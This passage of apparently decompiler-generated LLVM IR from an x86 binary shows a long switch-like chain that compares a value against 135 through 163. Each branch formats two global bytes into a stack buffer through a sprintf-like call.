  %v1_804b5e5 = icmp eq i1 %v12_804b5de, false
  br i1 %v1_804b5e5, label %dec_label_pc_804b611, label %dec_label_pc_804b5e7

dec_label_pc_804b5e7:                             ; preds = %dec_label_pc_804b5de
  %v0_804b5e7 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804b5e7 = zext i8 %v0_804b5e7 to i32
  store i32 %v1_804b5e7, i32* @edx, align 4
  %v0_804b5f3 = load i8, i8* @global_var_805b539.40, align 1
  %v1_804b5f3 = zext i8 %v0_804b5f3 to i32
  %v2_804b602 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b602, i32* @ebx, align 4
  %v5_804b609 = call i32 @szprintf(i32 %v2_804b602, i32 ptrtoint ([14 x i8]* @global_var_80585bd.170 to i32), i32 %v1_804b5f3, i32 %v1_804b5e7)
  br label %dec_label_pc_804b611

dec_label_pc_804b611:                             ; preds = %dec_label_pc_804b5de, %dec_label_pc_804b5e7
  %v12_804b611 = icmp eq i32 %v11_8049ca7, 135
  %v1_804b618 = icmp eq i1 %v12_804b611, false
  br i1 %v1_804b618, label %dec_label_pc_804b644, label %dec_label_pc_804b61a

dec_label_pc_804b61a:                             ; preds = %dec_label_pc_804b611
  %v0_804b61a = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804b61a = zext i8 %v0_804b61a to i32
  store i32 %v1_804b61a, i32* @edx, align 4
  %v0_804b626 = load i8, i8* @global_var_805b539.40, align 1
  %v1_804b626 = zext i8 %v0_804b626 to i32
  %v2_804b635 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b635, i32* @ebx, align 4
  %v5_804b63c = call i32 @szprintf(i32 %v2_804b635, i32 ptrtoint ([14 x i8]* @global_var_80585cb.171 to i32), i32 %v1_804b626, i32 %v1_804b61a)
  br label %dec_label_pc_804b644

dec_label_pc_804b644:                             ; preds = %dec_label_pc_804b611, %dec_label_pc_804b61a
  %v12_804b644 = icmp eq i32 %v11_8049ca7, 136
  %v1_804b64b = icmp eq i1 %v12_804b644, false
  br i1 %v1_804b64b, label %dec_label_pc_804b677, label %dec_label_pc_804b64d

dec_label_pc_804b64d:                             ; preds = %dec_label_pc_804b644
  %v0_804b64d = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804b64d = zext i8 %v0_804b64d to i32
  store i32 %v1_804b64d, i32* @edx, align 4
  %v0_804b659 = load i8, i8* @global_var_805b539.40, align 1
  %v1_804b659 = zext i8 %v0_804b659 to i32
  %v2_804b668 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b668, i32* @ebx, align 4
  %v5_804b66f = call i32 @szprintf(i32 %v2_804b668, i32 ptrtoint ([14 x i8]* @global_var_80585d9.172 to i32), i32 %v1_804b659, i32 %v1_804b64d)
  br label %dec_label_pc_804b677

dec_label_pc_804b677:                             ; preds = %dec_label_pc_804b644, %dec_label_pc_804b64d
  %v12_804b677 = icmp eq i32 %v11_8049ca7, 137
  %v1_804b67e = icmp eq i1 %v12_804b677, false
  br i1 %v1_804b67e, label %dec_label_pc_804b6aa, label %dec_label_pc_804b680

dec_label_pc_804b680:                             ; preds = %dec_label_pc_804b677
  %v0_804b680 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804b680 = zext i8 %v0_804b680 to i32
  store i32 %v1_804b680, i32* @edx, align 4
  %v0_804b68c = load i8, i8* @global_var_805b539.40, align 1
  %v1_804b68c = zext i8 %v0_804b68c to i32
  %v2_804b69b = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b69b, i32* @ebx, align 4
  %v5_804b6a2 = call i32 @szprintf(i32 %v2_804b69b, i32 ptrtoint ([13 x i8]* @global_var_80585e7.173 to i32), i32 %v1_804b68c, i32 %v1_804b680)
  br label %dec_label_pc_804b6aa

dec_label_pc_804b6aa:                             ; preds = %dec_label_pc_804b677, %dec_label_pc_804b680
  %v12_804b6aa = icmp eq i32 %v11_8049ca7, 138
  %v1_804b6b1 = icmp eq i1 %v12_804b6aa, false
  br i1 %v1_804b6b1, label %dec_label_pc_804b6dd, label %dec_label_pc_804b6b3

dec_label_pc_804b6b3:                             ; preds = %dec_label_pc_804b6aa
  %v0_804b6b3 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804b6b3 = zext i8 %v0_804b6b3 to i32
  store i32 %v1_804b6b3, i32* @edx, align 4
  %v0_804b6bf = load i8, i8* @global_var_805b539.40, align 1
  %v1_804b6bf = zext i8 %v0_804b6bf to i32
  %v2_804b6ce = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b6ce, i32* @ebx, align 4
  %v5_804b6d5 = call i32 @szprintf(i32 %v2_804b6ce, i32 ptrtoint ([13 x i8]* @global_var_80585f4.174 to i32), i32 %v1_804b6bf, i32 %v1_804b6b3)
  br label %dec_label_pc_804b6dd

dec_label_pc_804b6dd:                             ; preds = %dec_label_pc_804b6aa, %dec_label_pc_804b6b3
  %v12_804b6dd = icmp eq i32 %v11_8049ca7, 139
  %v1_804b6e4 = icmp eq i1 %v12_804b6dd, false
  br i1 %v1_804b6e4, label %dec_label_pc_804b710, label %dec_label_pc_804b6e6

dec_label_pc_804b6e6:                             ; preds = %dec_label_pc_804b6dd
  %v0_804b6e6 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804b6e6 = zext i8 %v0_804b6e6 to i32
  store i32 %v1_804b6e6, i32* @edx, align 4
  %v0_804b6f2 = load i8, i8* @global_var_805b539.40, align 1
  %v1_804b6f2 = zext i8 %v0_804b6f2 to i32
  %v2_804b701 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b701, i32* @ebx, align 4
  %v5_804b708 = call i32 @szprintf(i32 %v2_804b701, i32 ptrtoint ([13 x i8]* @global_var_8058601.175 to i32), i32 %v1_804b6f2, i32 %v1_804b6e6)
  br label %dec_label_pc_804b710

dec_label_pc_804b710:                             ; preds = %dec_label_pc_804b6dd, %dec_label_pc_804b6e6
  %v12_804b710 = icmp eq i32 %v11_8049ca7, 140
  %v1_804b717 = icmp eq i1 %v12_804b710, false
  br i1 %v1_804b717, label %dec_label_pc_804b743, label %dec_label_pc_804b719

dec_label_pc_804b719:                             ; preds = %dec_label_pc_804b710
  %v0_804b719 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804b719 = zext i8 %v0_804b719 to i32
  store i32 %v1_804b719, i32* @edx, align 4
  %v0_804b725 = load i8, i8* @global_var_805b539.40, align 1
  %v1_804b725 = zext i8 %v0_804b725 to i32
  %v2_804b734 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b734, i32* @ebx, align 4
  %v5_804b73b = call i32 @szprintf(i32 %v2_804b734, i32 ptrtoint ([13 x i8]* @global_var_805860e.176 to i32), i32 %v1_804b725, i32 %v1_804b719)
  br label %dec_label_pc_804b743

dec_label_pc_804b743:                             ; preds = %dec_label_pc_804b710, %dec_label_pc_804b719
  %v12_804b743 = icmp eq i32 %v11_8049ca7, 141
  %v1_804b74a = icmp eq i1 %v12_804b743, false
  br i1 %v1_804b74a, label %dec_label_pc_804b776, label %dec_label_pc_804b74c

dec_label_pc_804b74c:                             ; preds = %dec_label_pc_804b743
  %v0_804b74c = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804b74c = zext i8 %v0_804b74c to i32
  store i32 %v1_804b74c, i32* @edx, align 4
  %v0_804b758 = load i8, i8* @global_var_805b539.40, align 1
  %v1_804b758 = zext i8 %v0_804b758 to i32
  %v2_804b767 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b767, i32* @ebx, align 4
  %v5_804b76e = call i32 @szprintf(i32 %v2_804b767, i32 ptrtoint ([13 x i8]* @global_var_805861b.177 to i32), i32 %v1_804b758, i32 %v1_804b74c)
  br label %dec_label_pc_804b776

dec_label_pc_804b776:                             ; preds = %dec_label_pc_804b743, %dec_label_pc_804b74c
  %v12_804b776 = icmp eq i32 %v11_8049ca7, 142
  %v1_804b77d = icmp eq i1 %v12_804b776, false
  br i1 %v1_804b77d, label %dec_label_pc_804b7a9, label %dec_label_pc_804b77f

dec_label_pc_804b77f:                             ; preds = %dec_label_pc_804b776
  %v0_804b77f = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804b77f = zext i8 %v0_804b77f to i32
  store i32 %v1_804b77f, i32* @edx, align 4
  %v0_804b78b = load i8, i8* @global_var_805b539.40, align 1
  %v1_804b78b = zext i8 %v0_804b78b to i32
  %v2_804b79a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b79a, i32* @ebx, align 4
  %v5_804b7a1 = call i32 @szprintf(i32 %v2_804b79a, i32 ptrtoint ([13 x i8]* @global_var_8058628.178 to i32), i32 %v1_804b78b, i32 %v1_804b77f)
  br label %dec_label_pc_804b7a9

dec_label_pc_804b7a9:                             ; preds = %dec_label_pc_804b776, %dec_label_pc_804b77f
  %v12_804b7a9 = icmp eq i32 %v11_8049ca7, 143
  %v1_804b7b0 = icmp eq i1 %v12_804b7a9, false
  br i1 %v1_804b7b0, label %dec_label_pc_804b7dc, label %dec_label_pc_804b7b2

dec_label_pc_804b7b2:                             ; preds = %dec_label_pc_804b7a9
  %v0_804b7b2 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804b7b2 = zext i8 %v0_804b7b2 to i32
  store i32 %v1_804b7b2, i32* @edx, align 4
  %v0_804b7be = load i8, i8* @global_var_805b539.40, align 1
  %v1_804b7be = zext i8 %v0_804b7be to i32
  %v2_804b7cd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b7cd, i32* @ebx, align 4
  %v5_804b7d4 = call i32 @szprintf(i32 %v2_804b7cd, i32 ptrtoint ([14 x i8]* @global_var_805853f.161 to i32), i32 %v1_804b7be, i32 %v1_804b7b2)
  br label %dec_label_pc_804b7dc

dec_label_pc_804b7dc:                             ; preds = %dec_label_pc_804b7a9, %dec_label_pc_804b7b2
  %v9_804b7dc = icmp eq i32 %v11_8049ca7, 144
  %v1_804b7e3 = icmp eq i1 %v9_804b7dc, false
  br i1 %v1_804b7e3, label %dec_label_pc_804b80f, label %dec_label_pc_804b7e5

dec_label_pc_804b7e5:                             ; preds = %dec_label_pc_804b7dc
  %v0_804b7e5 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804b7e5 = zext i8 %v0_804b7e5 to i32
  store i32 %v1_804b7e5, i32* @edx, align 4
  %v0_804b7f1 = load i8, i8* @global_var_805b539.40, align 1
  %v1_804b7f1 = zext i8 %v0_804b7f1 to i32
  %v2_804b800 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b800, i32* @ebx, align 4
  %v5_804b807 = call i32 @szprintf(i32 %v2_804b800, i32 ptrtoint ([14 x i8]* @global_var_8058635.179 to i32), i32 %v1_804b7f1, i32 %v1_804b7e5)
  br label %dec_label_pc_804b80f

dec_label_pc_804b80f:                             ; preds = %dec_label_pc_804b7dc, %dec_label_pc_804b7e5
  %v12_804b80f = icmp eq i32 %v11_8049ca7, 145
  %v1_804b816 = icmp eq i1 %v12_804b80f, false
  br i1 %v1_804b816, label %dec_label_pc_804b842, label %dec_label_pc_804b818

dec_label_pc_804b818:                             ; preds = %dec_label_pc_804b80f
  %v0_804b818 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804b818 = zext i8 %v0_804b818 to i32
  store i32 %v1_804b818, i32* @edx, align 4
  %v0_804b824 = load i8, i8* @global_var_805b539.40, align 1
  %v1_804b824 = zext i8 %v0_804b824 to i32
  %v2_804b833 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b833, i32* @ebx, align 4
  %v5_804b83a = call i32 @szprintf(i32 %v2_804b833, i32 ptrtoint ([14 x i8]* @global_var_8058643.180 to i32), i32 %v1_804b824, i32 %v1_804b818)
  br label %dec_label_pc_804b842

dec_label_pc_804b842:                             ; preds = %dec_label_pc_804b80f, %dec_label_pc_804b818
  %v12_804b842 = icmp eq i32 %v11_8049ca7, 146
  %v1_804b849 = icmp eq i1 %v12_804b842, false
  br i1 %v1_804b849, label %dec_label_pc_804b875, label %dec_label_pc_804b84b

dec_label_pc_804b84b:                             ; preds = %dec_label_pc_804b842
  %v0_804b84b = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804b84b = zext i8 %v0_804b84b to i32
  store i32 %v1_804b84b, i32* @edx, align 4
  %v0_804b857 = load i8, i8* @global_var_805b539.40, align 1
  %v1_804b857 = zext i8 %v0_804b857 to i32
  %v2_804b866 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b866, i32* @ebx, align 4
  %v5_804b86d = call i32 @szprintf(i32 %v2_804b866, i32 ptrtoint ([14 x i8]* @global_var_8058651.181 to i32), i32 %v1_804b857, i32 %v1_804b84b)
  br label %dec_label_pc_804b875

dec_label_pc_804b875:                             ; preds = %dec_label_pc_804b842, %dec_label_pc_804b84b
  %v12_804b875 = icmp eq i32 %v11_8049ca7, 147
  %v1_804b87c = icmp eq i1 %v12_804b875, false
  br i1 %v1_804b87c, label %dec_label_pc_804b8a8, label %dec_label_pc_804b87e

dec_label_pc_804b87e:                             ; preds = %dec_label_pc_804b875
  %v0_804b87e = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804b87e = zext i8 %v0_804b87e to i32
  store i32 %v1_804b87e, i32* @edx, align 4
  %v0_804b88a = load i8, i8* @global_var_805b539.40, align 1
  %v1_804b88a = zext i8 %v0_804b88a to i32
  %v2_804b899 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b899, i32* @ebx, align 4
  %v5_804b8a0 = call i32 @szprintf(i32 %v2_804b899, i32 ptrtoint ([13 x i8]* @global_var_805865f.182 to i32), i32 %v1_804b88a, i32 %v1_804b87e)
  br label %dec_label_pc_804b8a8

dec_label_pc_804b8a8:                             ; preds = %dec_label_pc_804b875, %dec_label_pc_804b87e
  %v12_804b8a8 = icmp eq i32 %v11_8049ca7, 148
  %v1_804b8af = icmp eq i1 %v12_804b8a8, false
  br i1 %v1_804b8af, label %dec_label_pc_804b8db, label %dec_label_pc_804b8b1

dec_label_pc_804b8b1:                             ; preds = %dec_label_pc_804b8a8
  %v0_804b8b1 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804b8b1 = zext i8 %v0_804b8b1 to i32
  store i32 %v1_804b8b1, i32* @edx, align 4
  %v0_804b8bd = load i8, i8* @global_var_805b539.40, align 1
  %v1_804b8bd = zext i8 %v0_804b8bd to i32
  %v2_804b8cc = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b8cc, i32* @ebx, align 4
  %v5_804b8d3 = call i32 @szprintf(i32 %v2_804b8cc, i32 ptrtoint ([13 x i8]* @global_var_805866c.183 to i32), i32 %v1_804b8bd, i32 %v1_804b8b1)
  br label %dec_label_pc_804b8db

dec_label_pc_804b8db:                             ; preds = %dec_label_pc_804b8a8, %dec_label_pc_804b8b1
  %v12_804b8db = icmp eq i32 %v11_8049ca7, 149
  %v1_804b8e2 = icmp eq i1 %v12_804b8db, false
  br i1 %v1_804b8e2, label %dec_label_pc_804b90e, label %dec_label_pc_804b8e4

dec_label_pc_804b8e4:                             ; preds = %dec_label_pc_804b8db
  %v0_804b8e4 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804b8e4 = zext i8 %v0_804b8e4 to i32
  store i32 %v1_804b8e4, i32* @edx, align 4
  %v0_804b8f0 = load i8, i8* @global_var_805b539.40, align 1
  %v1_804b8f0 = zext i8 %v0_804b8f0 to i32
  %v2_804b8ff = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b8ff, i32* @ebx, align 4
  %v5_804b906 = call i32 @szprintf(i32 %v2_804b8ff, i32 ptrtoint ([14 x i8]* @global_var_8058679.184 to i32), i32 %v1_804b8f0, i32 %v1_804b8e4)
  br label %dec_label_pc_804b90e

dec_label_pc_804b90e:                             ; preds = %dec_label_pc_804b8db, %dec_label_pc_804b8e4
  %v12_804b90e = icmp eq i32 %v11_8049ca7, 150
  %v1_804b915 = icmp eq i1 %v12_804b90e, false
  br i1 %v1_804b915, label %dec_label_pc_804b941, label %dec_label_pc_804b917

dec_label_pc_804b917:                             ; preds = %dec_label_pc_804b90e
  %v0_804b917 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804b917 = zext i8 %v0_804b917 to i32
  store i32 %v1_804b917, i32* @edx, align 4
  %v0_804b923 = load i8, i8* @global_var_805b539.40, align 1
  %v1_804b923 = zext i8 %v0_804b923 to i32
  %v2_804b932 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b932, i32* @ebx, align 4
  %v5_804b939 = call i32 @szprintf(i32 %v2_804b932, i32 ptrtoint ([14 x i8]* @global_var_8058687.185 to i32), i32 %v1_804b923, i32 %v1_804b917)
  br label %dec_label_pc_804b941

dec_label_pc_804b941:                             ; preds = %dec_label_pc_804b90e, %dec_label_pc_804b917
  %v12_804b941 = icmp eq i32 %v11_8049ca7, 151
  %v1_804b948 = icmp eq i1 %v12_804b941, false
  br i1 %v1_804b948, label %dec_label_pc_804b974, label %dec_label_pc_804b94a

dec_label_pc_804b94a:                             ; preds = %dec_label_pc_804b941
  %v0_804b94a = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804b94a = zext i8 %v0_804b94a to i32
  store i32 %v1_804b94a, i32* @edx, align 4
  %v0_804b956 = load i8, i8* @global_var_805b539.40, align 1
  %v1_804b956 = zext i8 %v0_804b956 to i32
  %v2_804b965 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b965, i32* @ebx, align 4
  %v5_804b96c = call i32 @szprintf(i32 %v2_804b965, i32 ptrtoint ([14 x i8]* @global_var_8058695.186 to i32), i32 %v1_804b956, i32 %v1_804b94a)
  br label %dec_label_pc_804b974

dec_label_pc_804b974:                             ; preds = %dec_label_pc_804b941, %dec_label_pc_804b94a
  %v12_804b974 = icmp eq i32 %v11_8049ca7, 152
  %v1_804b97b = icmp eq i1 %v12_804b974, false
  br i1 %v1_804b97b, label %dec_label_pc_804b9a7, label %dec_label_pc_804b97d

dec_label_pc_804b97d:                             ; preds = %dec_label_pc_804b974
  %v0_804b97d = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804b97d = zext i8 %v0_804b97d to i32
  store i32 %v1_804b97d, i32* @edx, align 4
  %v0_804b989 = load i8, i8* @global_var_805b539.40, align 1
  %v1_804b989 = zext i8 %v0_804b989 to i32
  %v2_804b998 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b998, i32* @ebx, align 4
  %v5_804b99f = call i32 @szprintf(i32 %v2_804b998, i32 ptrtoint ([14 x i8]* @global_var_80584c6.152 to i32), i32 %v1_804b989, i32 %v1_804b97d)
  br label %dec_label_pc_804b9a7

dec_label_pc_804b9a7:                             ; preds = %dec_label_pc_804b974, %dec_label_pc_804b97d
  %v12_804b9a7 = icmp eq i32 %v11_8049ca7, 153
  %v1_804b9ae = icmp eq i1 %v12_804b9a7, false
  br i1 %v1_804b9ae, label %dec_label_pc_804b9da, label %dec_label_pc_804b9b0

dec_label_pc_804b9b0:                             ; preds = %dec_label_pc_804b9a7
  %v0_804b9b0 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804b9b0 = zext i8 %v0_804b9b0 to i32
  store i32 %v1_804b9b0, i32* @edx, align 4
  %v0_804b9bc = load i8, i8* @global_var_805b539.40, align 1
  %v1_804b9bc = zext i8 %v0_804b9bc to i32
  %v2_804b9cb = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b9cb, i32* @ebx, align 4
  %v5_804b9d2 = call i32 @szprintf(i32 %v2_804b9cb, i32 ptrtoint ([13 x i8]* @global_var_80586a3.187 to i32), i32 %v1_804b9bc, i32 %v1_804b9b0)
  br label %dec_label_pc_804b9da

dec_label_pc_804b9da:                             ; preds = %dec_label_pc_804b9a7, %dec_label_pc_804b9b0
  %v12_804b9da = icmp eq i32 %v11_8049ca7, 154
  %v1_804b9e1 = icmp eq i1 %v12_804b9da, false
  br i1 %v1_804b9e1, label %dec_label_pc_804ba0d, label %dec_label_pc_804b9e3

dec_label_pc_804b9e3:                             ; preds = %dec_label_pc_804b9da
  %v0_804b9e3 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804b9e3 = zext i8 %v0_804b9e3 to i32
  store i32 %v1_804b9e3, i32* @edx, align 4
  %v0_804b9ef = load i8, i8* @global_var_805b539.40, align 1
  %v1_804b9ef = zext i8 %v0_804b9ef to i32
  %v2_804b9fe = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b9fe, i32* @ebx, align 4
  %v5_804ba05 = call i32 @szprintf(i32 %v2_804b9fe, i32 ptrtoint ([13 x i8]* @global_var_80586b0.188 to i32), i32 %v1_804b9ef, i32 %v1_804b9e3)
  br label %dec_label_pc_804ba0d

dec_label_pc_804ba0d:                             ; preds = %dec_label_pc_804b9da, %dec_label_pc_804b9e3
  %v12_804ba0d = icmp eq i32 %v11_8049ca7, 155
  %v1_804ba14 = icmp eq i1 %v12_804ba0d, false
  br i1 %v1_804ba14, label %dec_label_pc_804ba40, label %dec_label_pc_804ba16

dec_label_pc_804ba16:                             ; preds = %dec_label_pc_804ba0d
  %v0_804ba16 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804ba16 = zext i8 %v0_804ba16 to i32
  store i32 %v1_804ba16, i32* @edx, align 4
  %v0_804ba22 = load i8, i8* @global_var_805b539.40, align 1
  %v1_804ba22 = zext i8 %v0_804ba22 to i32
  %v2_804ba31 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ba31, i32* @ebx, align 4
  %v5_804ba38 = call i32 @szprintf(i32 %v2_804ba31, i32 ptrtoint ([13 x i8]* @global_var_80586bd.189 to i32), i32 %v1_804ba22, i32 %v1_804ba16)
  br label %dec_label_pc_804ba40

dec_label_pc_804ba40:                             ; preds = %dec_label_pc_804ba0d, %dec_label_pc_804ba16
  %v12_804ba40 = icmp eq i32 %v11_8049ca7, 156
  %v1_804ba47 = icmp eq i1 %v12_804ba40, false
  br i1 %v1_804ba47, label %dec_label_pc_804ba73, label %dec_label_pc_804ba49

dec_label_pc_804ba49:                             ; preds = %dec_label_pc_804ba40
  %v0_804ba49 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804ba49 = zext i8 %v0_804ba49 to i32
  store i32 %v1_804ba49, i32* @edx, align 4
  %v0_804ba55 = load i8, i8* @global_var_805b539.40, align 1
  %v1_804ba55 = zext i8 %v0_804ba55 to i32
  %v2_804ba64 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ba64, i32* @ebx, align 4
  %v5_804ba6b = call i32 @szprintf(i32 %v2_804ba64, i32 ptrtoint ([13 x i8]* @global_var_80586ca.190 to i32), i32 %v1_804ba55, i32 %v1_804ba49)
  br label %dec_label_pc_804ba73

dec_label_pc_804ba73:                             ; preds = %dec_label_pc_804ba40, %dec_label_pc_804ba49
  %v12_804ba73 = icmp eq i32 %v11_8049ca7, 157
  %v1_804ba7a = icmp eq i1 %v12_804ba73, false
  br i1 %v1_804ba7a, label %dec_label_pc_804baa6, label %dec_label_pc_804ba7c

dec_label_pc_804ba7c:                             ; preds = %dec_label_pc_804ba73
  %v0_804ba7c = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804ba7c = zext i8 %v0_804ba7c to i32
  store i32 %v1_804ba7c, i32* @edx, align 4
  %v0_804ba88 = load i8, i8* @global_var_805b539.40, align 1
  %v1_804ba88 = zext i8 %v0_804ba88 to i32
  %v2_804ba97 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ba97, i32* @ebx, align 4
  %v5_804ba9e = call i32 @szprintf(i32 %v2_804ba97, i32 ptrtoint ([13 x i8]* @global_var_80586d7.191 to i32), i32 %v1_804ba88, i32 %v1_804ba7c)
  br label %dec_label_pc_804baa6

dec_label_pc_804baa6:                             ; preds = %dec_label_pc_804ba73, %dec_label_pc_804ba7c
  %v12_804baa6 = icmp eq i32 %v11_8049ca7, 158
  %v1_804baad = icmp eq i1 %v12_804baa6, false
  br i1 %v1_804baad, label %dec_label_pc_804bad9, label %dec_label_pc_804baaf

dec_label_pc_804baaf:                             ; preds = %dec_label_pc_804baa6
  %v0_804baaf = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804baaf = zext i8 %v0_804baaf to i32
  store i32 %v1_804baaf, i32* @edx, align 4
  %v0_804babb = load i8, i8* @global_var_805b539.40, align 1
  %v1_804babb = zext i8 %v0_804babb to i32
  %v2_804baca = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804baca, i32* @ebx, align 4
  %v5_804bad1 = call i32 @szprintf(i32 %v2_804baca, i32 ptrtoint ([12 x i8]* @global_var_80586e4.192 to i32), i32 %v1_804babb, i32 %v1_804baaf)
  br label %dec_label_pc_804bad9

dec_label_pc_804bad9:                             ; preds = %dec_label_pc_804baa6, %dec_label_pc_804baaf
  %v12_804bad9 = icmp eq i32 %v11_8049ca7, 159
  %v1_804bae0 = icmp eq i1 %v12_804bad9, false
  br i1 %v1_804bae0, label %dec_label_pc_804bb0c, label %dec_label_pc_804bae2

dec_label_pc_804bae2:                             ; preds = %dec_label_pc_804bad9
  %v0_804bae2 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804bae2 = zext i8 %v0_804bae2 to i32
  store i32 %v1_804bae2, i32* @edx, align 4
  %v0_804baee = load i8, i8* @global_var_805b539.40, align 1
  %v1_804baee = zext i8 %v0_804baee to i32
  %v2_804bafd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bafd, i32* @ebx, align 4
  %v5_804bb04 = call i32 @szprintf(i32 %v2_804bafd, i32 ptrtoint ([14 x i8]* @global_var_80586f0.193 to i32), i32 %v1_804baee, i32 %v1_804bae2)
  br label %dec_label_pc_804bb0c

dec_label_pc_804bb0c:                             ; preds = %dec_label_pc_804bad9, %dec_label_pc_804bae2
  %v9_804bb0c = icmp eq i32 %v11_8049ca7, 160
  %v1_804bb13 = icmp eq i1 %v9_804bb0c, false
  br i1 %v1_804bb13, label %dec_label_pc_804bb3f, label %dec_label_pc_804bb15

dec_label_pc_804bb15:                             ; preds = %dec_label_pc_804bb0c
  %v0_804bb15 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804bb15 = zext i8 %v0_804bb15 to i32
  store i32 %v1_804bb15, i32* @edx, align 4
  %v0_804bb21 = load i8, i8* @global_var_805b539.40, align 1
  %v1_804bb21 = zext i8 %v0_804bb21 to i32
  %v2_804bb30 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bb30, i32* @ebx, align 4
  %v5_804bb37 = call i32 @szprintf(i32 %v2_804bb30, i32 ptrtoint ([13 x i8]* @global_var_80586fe.194 to i32), i32 %v1_804bb21, i32 %v1_804bb15)
  br label %dec_label_pc_804bb3f

dec_label_pc_804bb3f:                             ; preds = %dec_label_pc_804bb0c, %dec_label_pc_804bb15
  %v12_804bb3f = icmp eq i32 %v11_8049ca7, 161
  %v1_804bb46 = icmp eq i1 %v12_804bb3f, false
  br i1 %v1_804bb46, label %dec_label_pc_804bb72, label %dec_label_pc_804bb48

dec_label_pc_804bb48:                             ; preds = %dec_label_pc_804bb3f
  %v0_804bb48 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804bb48 = zext i8 %v0_804bb48 to i32
  store i32 %v1_804bb48, i32* @edx, align 4
  %v0_804bb54 = load i8, i8* @global_var_805b539.40, align 1
  %v1_804bb54 = zext i8 %v0_804bb54 to i32
  %v2_804bb63 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bb63, i32* @ebx, align 4
  %v5_804bb6a = call i32 @szprintf(i32 %v2_804bb63, i32 ptrtoint ([14 x i8]* @global_var_805870b.195 to i32), i32 %v1_804bb54, i32 %v1_804bb48)
  br label %dec_label_pc_804bb72

dec_label_pc_804bb72:                             ; preds = %dec_label_pc_804bb3f, %dec_label_pc_804bb48
  %v12_804bb72 = icmp eq i32 %v11_8049ca7, 162
  %v1_804bb79 = icmp eq i1 %v12_804bb72, false
  br i1 %v1_804bb79, label %dec_label_pc_804bba5, label %dec_label_pc_804bb7b

dec_label_pc_804bb7b:                             ; preds = %dec_label_pc_804bb72
  %v0_804bb7b = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804bb7b = zext i8 %v0_804bb7b to i32
  store i32 %v1_804bb7b, i32* @edx, align 4
  %v0_804bb87 = load i8, i8* @global_var_805b539.40, align 1
  %v1_804bb87 = zext i8 %v0_804bb87 to i32
  %v2_804bb96 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bb96, i32* @ebx, align 4
  %v5_804bb9d = call i32 @szprintf(i32 %v2_804bb96, i32 ptrtoint ([14 x i8]* @global_var_8058719.196 to i32), i32 %v1_804bb87, i32 %v1_804bb7b)
  br label %dec_label_pc_804bba5

dec_label_pc_804bba5:                             ; preds = %dec_label_pc_804bb72, %dec_label_pc_804bb7b
  %v12_804bba5 = icmp eq i32 %v11_8049ca7, 163
  %v1_804bbac = icmp eq i1 %v12_804bba5, false
  br i1 %v1_804bbac, label %dec_label_pc_804bbd8, label %dec_label_pc_804bbae

dec_label_pc_804bbae:                             ; preds = %dec_label_pc_804bba5
  %v0_804bbae = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804bbae = zext i8 %v0_804bbae to i32
  store i32 %v1_804bbae, i32* @edx, align 4
  %v0_804bbba = load i8, i8* @global_var_805b539.40, align 1
  %v1_804bbba = zext i8 %v0_804bbba to i32
  %v2_804bbc9 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bbc9, i32* @ebx, align 4
  %v5_804bbd0 = call i32 @szprintf(i32 %v2_804bbc9, i32 ptrtoint ([14 x i8]* @global_var_8058727.197 to i32), i32 %v1_804bbba, i32 %v1_804bbae)
